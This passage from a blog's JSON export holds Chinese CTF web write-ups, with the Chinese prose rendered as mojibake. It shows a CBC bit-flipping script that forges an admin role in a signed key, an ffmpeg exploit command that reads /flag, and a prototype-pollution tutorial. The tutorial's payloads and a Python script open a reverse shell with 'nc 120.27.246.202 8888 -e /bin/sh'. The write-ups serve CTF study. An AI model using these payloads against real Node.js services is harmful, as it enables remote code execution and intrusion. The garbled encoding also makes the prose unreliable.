#print(user_key_decode) user_key_json_decode = json.loads(user_key_decode) signed_key = user_key_json_decode['signed_key'] #print(signed_key) cipher_o = base64.b64decode(signed_key) #print(cipher_o) if block &gt; 0: iv_prefix = cipher_o[:block * 16] else: iv_prefix = b'' iv = cipher_o[block * 16:16 + block * 16] cipher = cipher_o[16 + block * 16:] iv_array = bytearray(iv) for i in range(0, 16): iv_array[i] = iv_array[i] ^ ord(origin_content[i]) ^ ord(target_content[i]) iv = bytes(iv_array) #print(iv) user_key_json_decode['signed_key'] = base64.b64encode(iv_prefix + iv + cipher).decode('utf-8') return base64.b64encode(bytes(json.dumps(user_key_json_decode), \"utf-8\"))def get_user_info(key): r = requests.post(\"http://\" + host +\"/frontend/api/v1/user/info\", headers=&#123;\"Key\": key&#125;) if r.json()['code'] == 100: print(\"è·å–æˆåŠŸï¼\") #return r.json()['data']def modify_role_plain(key, role): user_key_decode = base64.b64decode(user_key) user_key_json_decode = json.loads(user_key_decode) user_key_json_decode['role'] = role return base64.b64encode(bytes(json.dumps(user_key_json_decode), 'utf-8')).decode('utf-8')print(\"ç¿»è½¬ Key:\")user_key = cbc_attack(\"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaEVqZjRGRjhTQVV5VjVmS3RqbGhuY0JWN1BLdlJ2UVlGdVUydlppRXRKYlV0NkJWZGRlZUp0Rll2Nnl4dmxpaVhYMTdEcVZ6WXJjVjJEeTloekpaM29Gcm9yV0hUWDh0T2N0bjFITXFSSlBnPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoyLCJwYXlsb2FkIjoidjByeEZqT2NJZW0xYzNta3o5Q2VINXZYdWxuZ0pES3AiLCJleHBpcmVfaW4iOjE1ODI5OTU2NDh9\", 0, '&#123;\"role\":3,\"user_', '&#123;\"role\":1,\"user_')user_key = modify_role_plain(user_key, 1)print(user_key)print(\"æµ‹è¯•æ‹‰å–ç”¨æˆ·ä¿¡æ¯ï¼š\")user_info = get_user_info(user_key)print(user_info) å¦‚æœæµ‹è¯•çš„è¿”å›æ²¡æœ‰é—®é¢˜çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥æ‹¿payloadä¿®æ”¹ä¸ºcookieç™»å½•äº†ã€‚å®é™…ä¸Šé¡µé¢æºç ä¸­ä¼šæç¤ºï¼Œé¢„è®¾ä¸€ä¸ªå€¼ä¸ºKeyçš„cookie,æ‰€ä»¥æˆ‘ä»¬ç›´æ¥æ·»åŠ Keyå€¼cookie,æˆåŠŸç™»é™†ã€‚æœ€åå°±æ˜¯ä¸€ä¸ªmiscå‹é¢˜ç›®äº†â€¦â€¦åå°å”¯ä¸€æ¯”è¾ƒæœ‰æ„æ€ çš„æ˜¯è§†é¢‘ä¸Šä¼ åŠŸèƒ½ï¼Œè€Œéšä¾¿ä¸Šä¼ åå†ä¸‹ä¸‹æ¥æˆ‘ä»¬çš„ä¸Šä¼ è§†é¢‘ï¼Œä¼šå‘ç°è§†é¢‘çš„MD5å€¼å‘ç”Ÿæ”¹å˜ã€‚è¯´æ˜å¯èƒ½æœåŠ¡å™¨å¯¹è§†é¢‘å¤„ç†è¿‡äº†ã€‚è¿™é‡Œèµµå¸ˆå‚…è®¾è®¡çš„æ˜¯ffmpegå¯¹è§†é¢‘å¤„ç†ã€‚æ‰€ä»¥å¯æ‰¾èƒ½å¤„ç†ffmpegæ¼æ´çš„è„šæœ¬https://github.com/neex/ffmpeg-avi-m3u-xbin/ 1python gen_xbin_avi.py file:&#x2F;&#x2F;&#x2F;flag test.avi ä¸Šä¼ åå†ä¸‹ä¸‹æ¥ï¼Œç¬¬ä¸€å¸§å°±æœ‰flagäº†ã€‚","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"}]},{"title":"ä»æ­ç”µhgame-week4å­¦åŸå‹é“¾æ±¡æŸ“","slug":"ä»æ­ç”µhgame-week4å­¦åŸå‹é“¾æ±¡æŸ“","date":"2020-02-18T08:20:22.000Z","updated":"2021-02-18T05:08:26.894Z","comments":true,"path":"2020/02/18/ä»æ­ç”µhgame-week4å­¦åŸå‹é“¾æ±¡æŸ“/","link":"","permalink":"https://www.bycsec.top/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","excerpt":"å› ä¸ºæ•°æ¨¡å¯¼è‡´æœ¬æ¥ä¸æ‰“ç®—åšweek4çš„é¢˜ç›®çš„ï¼Œä¸è¿‡å½“æ—¶ç…äº†ä¸€çœ¼sekiroè¿™é“é¢˜å¹¶ä¸”çœ‹å‡ºæ¥æ˜¯åŸå‹é“¾æ±¡æŸ“(ä¹Ÿæœ‰å«Node.jsæ±¡æŸ“,javasrciptåŸå‹é“¾æ±¡æŸ“çš„)ã€‚å¯æƒœå½“æ—¶æ²¡åšè¿‡ï¼Œæ²¡æ·±å…¥ä¹Ÿæ²¡åšå‡ºæ¥ã€‚ä»Šå¤©æŠ½ç©ºçœ‹äº†ä¸‹wpæ‰æ˜ç™½ã€‚å¹²è„†æŠŠå½“æ—¶æŸ¥é˜…èµ„æ–™å­¦åˆ°çš„çŸ¥è¯†æ€»ç»“ä¸‹ã€‚ æ—¶é—´çº¿ä¸Šçœ‹ï¼Œå›½å†…æœ€æ—©å‡ºç°çš„åŸå‹é“¾æ±¡æŸ“é¢˜ç›®åº”è¯¥æ˜¯å‡ºè‡ªPç‰›ä»£ç å®¡è®¡çŸ¥è¯†æ˜Ÿçƒçš„hard-the jsã€‚æ•´ä½“ä¸Šç®—æ¯”è¾ƒæ–°çš„æ´ã€‚åœ¨å„ç§æ¯”èµ›å‡ºç°é¢‘æ¬¡ä¸€èˆ¬ï¼ŒåŸå› æœ‰å¾ˆå¤šï¼Œè¿™ç‚¹ä¹‹åå†è°ˆã€‚å…¶ä¸»è¦æ˜¯å‰ç«¯å½¢å¼çš„æ”»å‡»ï¼Œè€Œä¸”æ¶‰åŠåˆ°javascriptçŸ¥è¯†æ›´å¤šäº›ï¼Œå› æ­¤è¿˜æ˜¯è¦ä»javascriptçš„è§’åº¦å­¦ä¹ ä¸‹ï¼š","text":"å› ä¸ºæ•°æ¨¡å¯¼è‡´æœ¬æ¥ä¸æ‰“ç®—åšweek4çš„é¢˜ç›®çš„ï¼Œä¸è¿‡å½“æ—¶ç…äº†ä¸€çœ¼sekiroè¿™é“é¢˜å¹¶ä¸”çœ‹å‡ºæ¥æ˜¯åŸå‹é“¾æ±¡æŸ“(ä¹Ÿæœ‰å«Node.jsæ±¡æŸ“,javasrciptåŸå‹é“¾æ±¡æŸ“çš„)ã€‚å¯æƒœå½“æ—¶æ²¡åšè¿‡ï¼Œæ²¡æ·±å…¥ä¹Ÿæ²¡åšå‡ºæ¥ã€‚ä»Šå¤©æŠ½ç©ºçœ‹äº†ä¸‹wpæ‰æ˜ç™½ã€‚å¹²è„†æŠŠå½“æ—¶æŸ¥é˜…èµ„æ–™å­¦åˆ°çš„çŸ¥è¯†æ€»ç»“ä¸‹ã€‚ æ—¶é—´çº¿ä¸Šçœ‹ï¼Œå›½å†…æœ€æ—©å‡ºç°çš„åŸå‹é“¾æ±¡æŸ“é¢˜ç›®åº”è¯¥æ˜¯å‡ºè‡ªPç‰›ä»£ç å®¡è®¡çŸ¥è¯†æ˜Ÿçƒçš„hard-the jsã€‚æ•´ä½“ä¸Šç®—æ¯”è¾ƒæ–°çš„æ´ã€‚åœ¨å„ç§æ¯”èµ›å‡ºç°é¢‘æ¬¡ä¸€èˆ¬ï¼ŒåŸå› æœ‰å¾ˆå¤šï¼Œè¿™ç‚¹ä¹‹åå†è°ˆã€‚å…¶ä¸»è¦æ˜¯å‰ç«¯å½¢å¼çš„æ”»å‡»ï¼Œè€Œä¸”æ¶‰åŠåˆ°javascriptçŸ¥è¯†æ›´å¤šäº›ï¼Œå› æ­¤è¿˜æ˜¯è¦ä»javascriptçš„è§’åº¦å­¦ä¹ ä¸‹ï¼š åŸå‹é“¾ç»å¸¸æœ‰è¿™æ ·ä¸€ç§è¯´æ³•ï¼šjavascriptä¸­ä¸‡ç‰©çš†å¯¹è±¡ã€‚è¿™ä¸ªè¯´æ³•ä¸¥æ ¼æ¥è®²ä¸å‡†ç¡®ï¼Œä½†æ˜¯å´ä½“ç°äº†jsè¯­æ³•åŠä½¿ç”¨ä¸Šçš„ç‰¹æ€§ã€‚javaScriptä¸­çš„å¯¹è±¡å…¶å®å°±æ˜¯ä¸€äº›é”®å€¼å¯¹çš„é›†åˆï¼Œæ¯ä¸€ä¸ªé”®å€¼å¯¹å«åšä¸€ä¸ªå±æ€§ï¼Œæ¯”å¦‚ï¼šæ­¤æ—¶å¯¹è±¡objå°±æœ‰äº†nameä¸websiteä¸¤ä¸ªå±æ€§ã€‚ä½†å…¶å®å…¶è¾“å‡ºå†…å®¹å¹¶ä¸åªæœ‰è¿™ä¸¤ä¸ªï¼Œå®Œæ•´è¾“å‡ºçš„å¦‚ä¸‹ï¼šå¯ä»¥çœ‹åˆ°ï¼Œè¾“å‡ºå±æ€§ä¸­å‡ºç°äº†protoä»¥åŠconstructorè¿™æ ·çš„å­—çœ¼ï¼Œé‚£ä»–ä»¬åˆ°åº•æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿè¿™è¦æåˆ°jsç»§æ‰¿çš„æ¦‚å¿µï¼Œç»§æ‰¿çš„æ•´ä¸ªè¿‡ç¨‹å°±ç§°ä¸ºè¯¥ç±»çš„åŸå‹é“¾ã€‚ä»åˆšåˆšçš„ä¾‹å­å¯ä»¥çœ‹åˆ°ï¼Œä»objçš„__proto__ä¸­èƒ½æ˜ç™½å…¶çˆ¶ç±»æ˜¯Object.(Constructorè¿”å›ç”¨äºåˆ›å»ºè¿™ä¸ªå¯¹è±¡çš„å‡½æ•°)ï¼ŒåŒæ—¶è¿˜æœ‰è®¸å¤šå…¶ä»–å‡½æ•°ã€‚ å¯¹äºç±»ï¼Œæœ‰ä¸€ä¸ªä¸ä¹‹ç›¸å¯¹åº”çš„å±æ€§ï¼Œå«åšprototypeã€‚ä¸”äºŒè€…ç­‰ä»·ã€‚æ¯”å¦‚ä¸‹é¢è¿™ä¸ªpç‰›çš„ç»å…¸ä¾‹å­ ä»ç±»çš„è§’åº¦è®²ï¼Œprototypeæ˜¯å…¶ä¸€ä¸ªå±æ€§ï¼Œæ‰€æœ‰ç±»å®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œéƒ½å°†æ‹¥æœ‰è¿™ä¸ªå±æ€§ä¸­çš„æ‰€æœ‰å†…å®¹ï¼ŒåŒ…æ‹¬å˜é‡å’Œæ–¹æ³•ã€‚ä½†æ˜¯ç±»æ‰€å®ä¾‹åŒ–çš„å¯¹è±¡å¹¶ä¸èƒ½é€šè¿‡prototypeè®¿é—®åŸå‹ï¼Œæ‰€ä»¥æ‰æœ‰__proto__å‡ºç°ï¼Œä¸”ä¸€ä¸ªå¯¹è±¡çš„protoå±æ€§ï¼ŒæŒ‡å‘è¿™ä¸ªå¯¹è±¡æ‰€åœ¨çš„ç±»çš„prototypeå±æ€§ã€‚ åŸå‹é“¾æ±¡æŸ“è€ŒåŸå‹é“¾çš„ç‰¹æ€§å†³å®šäº†å…¶åœ¨jsç»§æ‰¿ä¸­çš„é‡è¦ä¹‹å¤„ã€‚è€Œå…¶ç‰¹æ€§è¡¨ç°åœ¨ï¼Œåœ¨æˆ‘ä»¬è°ƒç”¨ä¸€ä¸ªå¯¹è±¡çš„æŸä¸€å±æ€§æ—¶ï¼š 1231.å¯¹è±¡(obj)ä¸­å¯»æ‰¾è¿™ä¸€å±æ€§2.å¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™åœ¨obj.__proto__ä¸­å¯»æ‰¾å±æ€§3.å¦‚æœä»ç„¶æ‰¾ä¸åˆ°ï¼Œåˆ™ç»§ç»­åœ¨obj.__proto__.__proto__ä¸­å¯»æ‰¾è¿™ä¸€å±æ€§ ä»¥ä¸Šæœºåˆ¶è¢«ç§°ä¸ºjsçš„prototypeç»§æ‰¿é“¾ã€‚è€ŒåŸå‹é“¾æ±¡æŸ“å°±ä¸è¿™æœ‰å…³ æ¯”å¦‚ä»¥ä¸‹ä»£ç ï¼š 123456let foo = &#123;bar: 1&#125;console.log(foo.bar)foo.__proto__.bar = 2console.log(foo.bar)let zoo = &#123;&#125;console.log(zoo.bar) ç»“æœä¸ºå¯ä»¥å‘ç°ï¼Œåœ¨æˆ‘ä»¬é€šè¿‡__proto__ä¿®æ”¹barå€¼åï¼Œå†åº¦å®ä¾‹åŒ–ä¸€ä¸ªæ–°çš„å¯¹è±¡æ—¶ï¼Œå…¶barå€¼ä»1å˜ä¸ºäº†2ã€‚åŸå› å¦‚ä¸‹ï¼šå‰é¢ä¿®æ”¹fooçš„åŸå‹foo.__proto__.bar = 2ï¼Œè€Œfooæ˜¯ä¸€ä¸ªObjectç±»çš„å®ä¾‹ï¼Œæ‰€ä»¥å®é™…ä¸Šæ˜¯ä¿®æ”¹äº†Objectè¿™ä¸ªç±»ï¼Œç»™è¿™ä¸ªç±»å¢åŠ äº†ä¸€ä¸ªå±æ€§barï¼Œå€¼ä¸º2.é‚£ä¹ˆåé¢æˆ‘ä»¬zooç›¸å½“äºæ˜¯å®ä¾‹åŒ–äº†ä¸€ä¸ªObjectç±»ï¼Œè‡ªç„¶æœ‰å±æ€§bar=2. æ‰€ä»¥åŸå‹é“¾æ±¡æŸ“å®šä¹‰å¦‚ä¸‹ï¼š å¦‚æœæ”»å‡»è€…æ§åˆ¶å¹¶ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ã€‚è¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯åŸå‹é“¾æ±¡æŸ“ ä½¿ç”¨åœºæ™¯åŸå‹é“¾æ±¡æŸ“çš„ä½¿ç”¨åœºæ™¯æˆ‘ä¹Ÿä¸ç†Ÿï¼Œä½†æ˜¯ç›®å‰æ ¹æ®é¢˜ç›®å‡ºç°çš„æƒ…å†µï¼Œä¸»è¦ä¸è¿™ä¸¤ä¸ªå‡½æ•°æœ‰å…³ 12merge()clone() å¸¸ç”¨æºç å¦‚ä¸‹,å¯ä»¥çœ‹å‡ºcloneä¸mergeå¹¶æ— æœ¬è´¨åŒºåˆ«ï¼š 12345678910111213const merge = (a, b) =&gt; &#123; for (var attr in b) &#123; if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123; merge(a[attr], b[attr]); &#125; else &#123; a[attr] = b[attr]; &#125; &#125; return a&#125;const clone = (a) =&gt; &#123; return merge(&#123;&#125;, a);&#125; æœ¬è´¨ä¸Šè¿™ä¸¤ä¸ªå‡½æ•°ä¼šæœ‰é£é™©ï¼Œå°±æ˜¯å› ä¸ºå­˜åœ¨èƒ½å¤Ÿæ§åˆ¶æ•°ç»„ï¼ˆå¯¹è±¡ï¼‰çš„â€œé”®åâ€çš„æ“ä½œã€‚ä½†æ˜¯è¦æƒ³å®ç°åŸå‹é“¾æ±¡æŸ“ï¼Œå…‰åªè¦é”®åå¯æ§æ˜¯ä¸å¤Ÿçš„ã€‚ä»¥ä¸‹é¢è¿™ä¸ªä¾‹å­ä¸ºå‚è€ƒï¼š 123456789function merge(target, source) &#123; for (let key in source) &#123; if (key in source &amp;&amp; key in target) &#123; merge(target[key], source[key]) &#125; else &#123; target[key] = source[key] &#125; &#125;&#125; å°è¯•æŠŠç¬¬äºŒä¸ªé”®åè®¾ä¸º__proto__å¹¶èµ‹å€¼bä¸º2ã€‚çœ‹çœ‹èƒ½ä¸èƒ½æŠŠobjectçš„å±æ€§bæ”¹ä¸º2ã€‚å¯ä»¥çœ‹è§æœ€åo3.bè¿”å›çš„æ˜¯undefined,å¹¶æ²¡æœ‰æ±¡æŸ“æˆåŠŸã€‚ä¸»è¦åŸå› å°±æ˜¯å› ä¸º__proto__æ²¡æœ‰è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªé”®åã€‚è€Œè¿™å°±éœ€è¦æˆ‘ä¸Šé¢æåˆ°çš„å¦ä¸€ä¸ªæ¡ä»¶,ä»£ç å¦‚ä¸‹æ—¶ï¼š 1234567let o1 = &#123;&#125;let o2 = JSON.parse('&#123;\"a\": 1, \"__proto__\": &#123;\"b\": 2&#125;&#125;')merge(o1, o2)console.log(o1.a, o1.b)o3 = &#123;&#125;console.log(o3.b) å¦‚æœå­˜åœ¨JSON.parse()ï¼Œå°±èƒ½æˆåŠŸæŠŠ__proto__è§£ææˆé”®åäº†ã€‚ æœ‰äº†è¿™äº›åŸºç¡€ï¼Œå°±åŸºæœ¬èƒ½äº†è§£åŸå‹é“¾æ±¡æŸ“çš„åŸç†äº†ã€‚ çœŸé¢˜hgame sekiroå›å¤´æ¥çœ‹hgameä¸­sekiroè¿™é“é¢˜ï¼Œé¢˜ç›®ç»™å‡ºçš„å…³é”®æºç ä¸»è¦åœ¨ä¸€ä¸‹ä¸¤ä¸ªjsæ–‡ä»¶ä¸­route/index.js 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758var express = require('express');var router = express.Router();var game = require('../utils/index');const isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;const merge = (a, b) =&gt; &#123; for (var attr in b) &#123; if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123; merge(a[attr], b[attr]); &#125; else &#123; a[attr] = b[attr]; &#125; &#125; return a&#125;const clone = (a) =&gt; &#123; return merge(&#123;&#125;, a);&#125;var Game = new game();router.get('/', function (req, res) &#123; res.render('index');&#125;);router.post('/action', function (req, res) &#123; if (!req.session.sekiro) &#123; res.end(\"Session required.\") &#125; if (!req.session.sekiro.alive) &#123; res.end(\"You dead.\") &#125; var body = JSON.parse(JSON.stringify(req.body)); var copybody = clone(body) if (copybody.solution) &#123; req.session.sekiro = Game.dealWithAttacks(req.session.sekiro, copybody.solution) &#125; res.end(\"æäº¤æˆåŠŸ\")&#125;)router.get('/attack', function (req, res) &#123; if (!req.session.sekiro) &#123; res.end(\"Session required.\") &#125; if (!req.session.sekiro.alive) &#123; res.end(\"You dead.\") &#125; req.session.sekiro.attackInfo = Game.getAttackInfo() res.end(req.session.sekiro.attackInfo.method)&#125;)router.get('/info', function (req, res) &#123; if (typeof(req.query.restart) != \"undefined\" || !req.session.sekiro) &#123; req.session.sekiro = &#123; \"health\": 3000, posture: 0, alive: true &#125; &#125; res.json(req.session.sekiro);&#125;)module.exports = router; ä»¥åŠutil/index.js 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950function game() &#123; this.attacks = [ &#123; \"method\": \"è¿ç»­ç å‡»\", \"attack\": 1000, \"additionalEffect\": \"sekiro.posture+=100\", \"solution\": \"è¿ç»­æ ¼æŒ¡\" &#125;, &#123; \"method\": \"æ™®é€šæ”»å‡»\", \"attack\": 500, \"additionalEffect\": \"sekiro.posture+=50\", \"solution\": \"æ ¼æŒ¡\" &#125;, &#123; \"method\": \"ä¸‹æ®µæ”»å‡»\", \"attack\": 1000, \"solution\": \"è·³è·ƒè¸©å¤´\" &#125;, &#123; \"method\": \"çªåˆºæ”»å‡»\", \"attack\": 1000, \"solution\": \"è¯†ç ´\" &#125;, &#123; \"method\": \"å·´ä¹‹é›·\", \"attack\": 1000, \"solution\": \"é›·å\" &#125;, ] this.getAttackInfo = function () &#123; return this.attacks[Math.floor(Math.random() * this.attacks.length)] &#125; this.dealWithAttacks = function (sekiro, solution) &#123; if (sekiro.attackInfo.solution !== solution) &#123; sekiro.health -= sekiro.attackInfo.attack if (sekiro.attackInfo.additionalEffect) &#123; var fn = Function(\"sekiro\", sekiro.attackInfo.additionalEffect + \"\\nreturn sekiro\") sekiro = fn(sekiro) &#125; &#125; sekiro.posture = (sekiro.posture &lt;= 500) ? sekiro.posture : 500 sekiro.health = (sekiro.health &gt; 0) ? sekiro.health : 0 if (sekiro.posture == 500 || sekiro.health == 0) &#123; sekiro.alive = false &#125; return sekiro &#125;&#125;module.exports = game; å¾ˆå®¹æ˜“å‘ç°index.jsä¸­ï¼Œåœ¨/actionè¿™ä¸ªè·¯ç”±é‡Œï¼Œæœ‰merge(),clone()å‡½æ•°çš„å‡ºç°ã€‚äºæ˜¯æˆ‘ä»¬è·Ÿè¿›ä¸‹ï¼Œå‘ç°è¦åˆ°dealWithAttacks()è¿™ä¸ªå‡½æ•°å»ï¼Œäºæ˜¯å†å®¡è®¡ä¸‹å…³é”®ä»£ç ï¼š 1234if (sekiro.attackInfo.additionalEffect) &#123; var fn = Function(\"sekiro\", sekiro.attackInfo.additionalEffect + \"\\nreturn sekiro\") sekiro = fn(sekiro)&#125; è¿™é‡Œçš„attackInfo.additionalEffectå¦‚æœèƒ½è¢«æˆ‘ä»¬æ±¡æŸ“ï¼Œæ˜æ˜¾æ˜¯å¯ä»¥ç›´æ¥RCEçš„ã€‚é‚£ä¹ˆæˆ‘ä»¬è¦åšçš„å°±æ˜¯æ±¡æŸ“Objectç±»ï¼Œå½“é¢˜ç›®æ‰§è¡ŒattackInfo.additionalEffectæ‰¾ä¸åˆ°additionalEffectæ—¶ï¼Œå°±ä¼šç»§ç»­æ‰¾åˆ°åŸºç±»è¢«æ±¡æŸ“çš„è¿™ä¸€å±æ€§ï¼Œä»è€Œæ‰§è¡Œæˆ‘ä»¬çš„ä»£ç ã€‚ æ‰€ä»¥paylaodå¦‚ä¸‹ 1&#123;\"solution\":\"1\",\"__proto__\": &#123;\"additionalEffect\":\"global.process.mainModule.constructor._load('child_process'). exec('nc vps-ip 8877 -e /bin/sh',function()&#123;&#125;);\"&#125;&#125; æˆ‘åœ¨ä½¿ç”¨bpä¼ å€¼æ—¶æ²¡å¼¹åˆ°shell,åæ¥åªèƒ½ç”¨pythonå†™è„šæœ¬äº†ï¼Œä¹Ÿè®¸æ˜¯JSONæ•°æ®çš„é—®é¢˜å§ã€‚ 1234567891011121314import requestsimport jsonurl='http://sekiro.hgame.babelfish.ink/action'cookie=&#123; 'session':'s%3ACDDqh7q_XQ-rRAIB7W93PfE75p9oD7gS.UQuPEE0eikMrkIoAUaWJ3TFIibdRs72odZliCVcyzrk'&#125;headers=&#123; 'Content-Type':'application/json'&#125;payload=&#123;\"solution\":\"1\",\"__proto__\": &#123;\"additionalEffect\":\"global.process.mainModule.constructor._load('child_process'). exec('nc 120.27.246.202 8888 -e /bin/sh',function()&#123;&#125;);\"&#125;&#125;res=requests.post(url,cookies=cookie,headers=headers,data=json.dumps(payload))print(res.text) ä½¿ç”¨bashå¼¹shellè²Œä¼¼æ²¡æˆï¼Œå¯èƒ½æ˜¯æŸäº›å¥‡æ€ªçš„é—®é¢˜ code-breaking thejså¼€å¤´æåˆ°äº†pç‰›çŸ¥è¯†æ˜Ÿçƒçš„è¿™é“é¢˜ï¼Œé‚£ä¹ˆç°åœ¨å†æ¥çœ‹çœ‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142const fs = require('fs')const express = require('express')const bodyParser = require('body-parser')const lodash = require('lodash')const session = require('express-session')const randomize = require('randomatic')const app = express()app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())app.use('/static', express.static('static'))app.use(session(&#123; name: 'thejs.session', secret: randomize('aA0', 16), resave: false, saveUninitialized: false&#125;))app.engine('ejs', function (filePath, options, callback) &#123; // define the template engine fs.readFile(filePath, (err, content) =&gt; &#123; if (err) return callback(new Error(err)) let compiled = lodash.template(content) let rendered = compiled(&#123;...options&#125;) return callback(null, rendered) &#125;)&#125;)app.set('views', './views')app.set('view engine', 'ejs')app.all('/', (req, res) =&gt; &#123; let data = req.session.data || &#123;language: [], category: []&#125; if (req.method == 'POST') &#123; data = lodash.merge(data, req.body) req.session.data = data &#125; res.render('index', &#123; language: data.language, category: data.category &#125;)&#125;)app.listen(3000, () =&gt; console.log(`Example app listening on port 3000!`)) æ¼æ´ç‚¹éå¸¸æ¸…æ™°ï¼Œå°±æ˜¯ä¸€ä¸ªPOSTå¤„ç”¨åˆ°äº†merge,æ˜¾ç„¶å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚é‚£ä¹ˆå…³é”®å‡½æ•°éœ€è¦å»çœ‹çœ‹ï¼Œæ‰€ä»¥éœ€è¦å‚è€ƒlodashçš„ä»£ç ï¼ˆlodashæ˜¯ä¸€ä¸ªè¾…åŠ©åŠŸèƒ½é›†ï¼Œè¿™é‡Œä¸»è¦ç”¨åˆ°çš„è¿˜æ˜¯lodash.mergeå’Œlodash.templateï¼‰å¦‚æœå»å®¡è®¡æºç ï¼Œä¼šå‘ç°è¿™æ ·ä¸€ä¸ªå±æ€§https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165åŠå¯¹åº”æºç ï¼Œå’Œåé¢çš„è°ƒç”¨ã€‚ 123456var sourceURL = 'sourceURL' in options ? '//# sourceURL=' + options.sourceURL + '\\n' : '';// ...var result = attempt(function() &#123; return Function(importsKeys, sourceURL + 'return ' + source) .apply(undefined, importsValues);&#125;); å¼€å§‹sourceURLæ˜¯ç©ºå€¼ï¼Œä½†æ˜¯åé¢å®ƒä½œä¸ºnew Functionçš„ç¬¬äºŒä¸ªå‚æ•°ä¸­ï¼Œé€ æˆä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ‰€ä»¥payloadå¦‚ä¸‹ï¼š 1&#123;\"__proto__\":&#123;\"sourceURL\":\"\\u000aglobal.process.mainModule.constructor._load('child_process').exec('nc 120.27.246.202 8888 -e /bin/sh',function()&#123;&#125;);\"&#125;&#125; éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ­¤å¤„çš„/u000aå¿…ä¸å¯å°‘,è¿™æ—¶jsonä¸­çš„æ¢è¡Œã€‚å¹¶ä¸”ä¸€å®šè¦æŠŠContent-Typeå¿…é¡»è®¾ç½®æˆapplication/jsonã€‚å¦åˆ™__proto__ä¼šè¢«å¤„ç†æˆå­—ç¬¦ä¸²ã€‚è¿™é‡ŒåŒæ ·ä½¿ç”¨è·Ÿhgameé‚£é“é¢˜ä¸€æ ·çš„å¼¹shellæ‰‹æ®µã€‚å¯ä»¥æ‹¿åˆ°shellåŒæ—¶å› ä¸ºä¸çŸ¥é“æ–‡ä»¶åï¼Œä½¿ç”¨cat /fl*æ¥æ¨¡ç³Šå¤„ç†ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œpç‰›å¯¹æ­¤é¢˜çš„payloadé¢å¤–å¸¦äº†ä¸€ä¸ªforå¾ªç¯ 1for (var a in&#123;&#125;) &#123;delete Object.prototype[a]&#125; åˆ æ‰æ±¡æŸ“çš„åŸå‹ã€‚è¿™æ—¶å› ä¸ºåŸå‹æ±¡æŸ“è¿™ä¸€æ¼æ´é™¤éæ•´ä¸ªç¨‹åºé‡å¯ï¼Œå¦åˆ™æ‰€æœ‰çš„å¯¹è±¡éƒ½ä¼šè¢«æ±¡æŸ“ä¸å½±å“ã€‚è¿™æ ·åœ¨awdç­‰ç­‰æ¯”èµ›ä¸­ä¸€æ—¦ä½ æ‹¿åˆ°flag,å°±æœ‰å¯èƒ½è¢«åˆ«äººç›´æ¥è®¿é—®åˆ°ã€‚ æ€»ç»“ä¸‹ï¼š1.åŸå‹é“¾æ±¡æŸ“å±äºå‰ç«¯æ¼æ´åº”ç”¨ï¼ŒåŸºæœ¬ä¸Šéœ€è¦æºç å®¡è®¡åŠŸåŠ›æ¥è¿›è¡Œè§£å†³ï¼›æ‰¾åˆ°merge(),clone()åªæ˜¯ç¡®å®šæ¼æ´çš„å¼€å§‹2.è¿›è¡Œå®¡è®¡éœ€è¦ä»¥è¾¾æˆRCEä¸ºä¸»è¦ç›®çš„ã€‚é€šå¸¸exec, returnç­‰ç­‰éƒ½æ˜¯å€¼å¾—æ³¨æ„çš„å…³é”®å­—ã€‚3.é¢˜ç›®åŸºæœ¬æ˜¯ä»¥å¼¹shellä¸ºæœ€ç»ˆç›®çš„ã€‚ç›®å‰æ¥çœ‹å¾ˆå¤šNode.jsä¼ ç»Ÿå¼¹shellæ–¹å¼å¹¶ä¸é€‚ç”¨.wget,curl,ä»¥åŠæˆ‘ä¸¤é“é¢˜éƒ½ç”¨åˆ°çš„ncæ¯”è¾ƒé€‚ç”¨ã€‚ å‚è€ƒæ–‡ç« ï¼š https://www.anquanke.com/post/id/176884#h3-5https://xz.aliyun.com/t/2802https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"javascript","slug":"javascript","permalink":"https://www.bycsec.top/tags/javascript/"}]},{"title":"å®‰æ´µæ¯2019-webå¤ç°","slug":"å®‰æ´µæ¯2019-webå¤ç°","date":"2020-02-10T03:02:32.000Z","updated":"2021-02-18T05:08:21.568Z","comments":true,"path":"2020/02/10/å®‰æ´µæ¯2019-webå¤ç°/","link":"","permalink":"https://www.bycsec.top/2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/","excerpt":"å‘ç°buuojä¸Šå®‰æ´µ2019çš„é¢˜ç›®æœ‰ç°æˆçš„ï¼Œä¸ç”¨åœ¨vpsä¸Šæ­äº†(ç¬¬ä¸€é¢˜é™